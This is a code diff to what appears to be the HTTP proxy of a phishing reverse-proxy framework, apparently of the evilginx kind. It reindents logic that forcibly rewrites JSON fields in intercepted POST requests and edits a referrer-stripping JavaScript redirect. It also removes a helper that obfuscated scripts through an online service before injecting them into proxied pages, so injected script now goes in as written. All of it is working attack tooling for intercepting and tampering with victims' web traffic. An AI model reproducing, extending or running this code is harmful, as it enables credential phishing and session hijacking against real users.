@@ -711,42 +711,43 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 
 							// force post json
-for _, fp := range pl.forcePost {
-    if fp.path.MatchString(req.URL.Path) {
-        log.Debug("force_post: url matched: %s", req.URL.Path)
-        ok_search := false
-        if len(fp.search) > 0 {
-            k_matched := len(fp.search)
-            for _, fp_s := range fp.search {
-                matches := fp_s.key.FindAllString(string(body), -1)
-                for _, match := range matches {
-                    if fp_s.search.MatchString(match) {
-                        if k_matched > 0 {
-                            k_matched -= 1
-                        }
-                        log.Debug("force_post: [%d] matched - %s", k_matched, match)
-                        break
-                    }
-                }
-            }
-            if k_matched == 0 {
-                ok_search = true
-            }
-        } else {
-            ok_search = true
-        }
-        if ok_search {
-            for _, fp_f := range fp.force {
-                body, err = SetJSONVariable(body, fp_f.key, fp_f.value)
-                if err != nil {
-                    log.Debug("force_post: got error: %s", err)
-                }
-                log.Debug("force_post: updated body parameter: %s : %s", fp_f.key, fp_f.value)
-            }
-        }
-        req.ContentLength = int64(len(body))
-        log.Debug("force_post: body: %s len:%d", body, len(body))
-    }
+							for _, fp := range pl.forcePost {
+								if fp.path.MatchString(req.URL.Path) {
+									log.Debug("force_post: url matched: %s", req.URL.Path)
+									ok_search := false
+									if len(fp.search) > 0 {
+										k_matched := len(fp.search)
+										for _, fp_s := range fp.search {
+											matches := fp_s.key.FindAllString(string(body), -1)
+											for _, match := range matches {
+												if fp_s.search.MatchString(match) {
+													if k_matched > 0 {
+														k_matched -= 1
+													}
+													log.Debug("force_post: [%d] matched - %s", k_matched, match)
+													break
+												}
+											}
+										}
+										if k_matched == 0 {
+											ok_search = true
+										}
+									} else {
+										ok_search = true
+									}
+									if ok_search {
+										for _, fp_f := range fp.force {
+											body, err = SetJSONVariable(body, fp_f.key, fp_f.value)
+											if err != nil {
+												log.Debug("force_post: got error: %s", err)
+											}
+											log.Debug("force_post: updated body parameter: %s : %s", fp_f.key, fp_f.value)
+										}
+									}
+									req.ContentLength = int64(len(body))
+									log.Debug("force_post: body: %s len:%d", body, len(body))
+								}
+							}
 
 						} else if form_re.MatchString(contentType) {
 
@@ -1312,42 +1313,12 @@ func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body st
 }
 
 func (p *HttpProxy) javascriptRedirect(req *http.Request, rurl string) (*http.Request, *http.Response) {
-	body := fmt.Sprintf("<html><head><meta content='no-referrer name='referrer'><script>if(window.self!='google.com'){top.location.href='%s';}</script></head><body></body></html>", rurl)
+	body := fmt.Sprintf("<html><head><meta name='referrer' content='no-referrer'><script>top.location.href='%s';</script></head><body></body></html>", rurl)
 	resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
 	if resp != nil {
 		return req, resp
 	}
 	return req, nil
-}
-
-func obfuscateJavaScript(script string) (string, error) {
-	type ObfuscatorResponse struct {
-		ObfuscatedCode string `json:"obfuscatedCode"`
-	}
-	apiURL := "https://obfuscator.io/api/obfuscate"
-	requestBody, err := json.Marshal(map[string]string{
-		"source": script,
-	})
-	if err != nil {
-		return "", err
-	}
-	resp, err := http.Post(apiURL, "application/json", bytes.NewBuffer(requestBody))
-	if err != nil {
-		return "", err
-	}
-	defer resp.Body.Close()
-
-	body, err := ioutil.ReadAll(resp.Body)
-	if err != nil {
-		return "", err
-	}
-
-	var obfuscatorResponse ObfuscatorResponse
-	err = json.Unmarshal(body, &obfuscatorResponse)
-	if err != nil {
-		return "", err
-	}
-	return obfuscatorResponse.ObfuscatedCode, nil
 }
 
 func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url string) []byte {
@@ -1360,19 +1331,12 @@ func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url
 	re := regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
 	var d_inject string
 	if script != "" {
-		obfuscatedScript, err := obfuscateJavaScript(script)
-		if err != nil {
-			log.Debug("Javascript obfuscation: Failed - (Using original javascript)")
-			obfuscatedScript = script // Fallback to original script
-		}
-		log.Debug("Javascript obfuscation: Success")
-		d_inject = "<script" + js_nonce + ">" + obfuscatedScript + "</script>\n${1}"
+		d_inject = "<script" + js_nonce + ">" + script + "</script>\n${1}"
 	} else if src_url != "" {
 		d_inject = "<script" + js_nonce + " type=\"application/javascript\" src=\"" + src_url + "\"></script>\n${1}"
 	} else {
 		return body
 	}
-	log.Debug("Javascript Injected...")
 	ret := []byte(re.ReplaceAllString(string(body), d_inject))
 	return ret
 }
